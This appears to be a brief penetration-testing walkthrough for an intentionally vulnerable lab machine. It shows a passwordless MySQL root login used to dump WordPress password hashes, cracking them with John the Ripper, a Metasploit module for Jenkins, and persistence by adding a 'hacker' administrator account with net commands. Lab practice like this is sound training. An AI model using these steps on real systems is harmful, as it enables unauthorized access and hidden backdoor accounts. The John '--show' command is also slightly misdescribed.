The first thing you should do, is run some recon with N-Map and see what it has open. 
Refer to the N-Map guide on how to do that. 


Example Exploits: 
1. Remote Desktop
Try remote desktop (port 3389), by default allows any windows credentials to authenticate.

2. Wordpress
During my recon, I discovered that the mysql instance running on port 3306 allowed root to authenticate without a password.

Using this access, I was able to pull usernames and hashed passwords from the wordpress database.

mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0 |
| vagrant    | $P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/ |
| user       | $P$B83ijKvzkiB6yZL8Ubpi35CMQHiQjv/ |
| manager    | $P$BvcrF0Y02JqJRkbXMREj/CBvP..21s1 |
+------------+------------------------------------+

As this is an intentionally vulnerable target, I was confident that the passwords would be weak. I set John running against the admin hash, which soon found the password.

The command to run john the ripper is:
john wordpress_admin_hash.txt --show

You should get a result in a few seconds for the admin account. 

3. Jenkins
There is a jenkins instance running on port 8484, which can be exploited with exploit/multi/http/jenkins/jenkins_script_console. This is also running as the local service account.

4. Other attack vectors include: 
GlassFish
Apache Struts
Tomcat
IIS FTP
IIS HTTP
psexec
SSH
WinRM
chinese caidao
ManageEngine
ElasticSearch
Apache Axis2
WebDAV
SNMP
MySQL
JMX
SMB
PHPMyAdmin




Example Persistance: 
There are many ways to keep access after patches/security modifications. Here are a few: 
net users hacker hacker /add
net localgroup administrators hacker /add
Use this to remote desktop directly to the server on this account. 
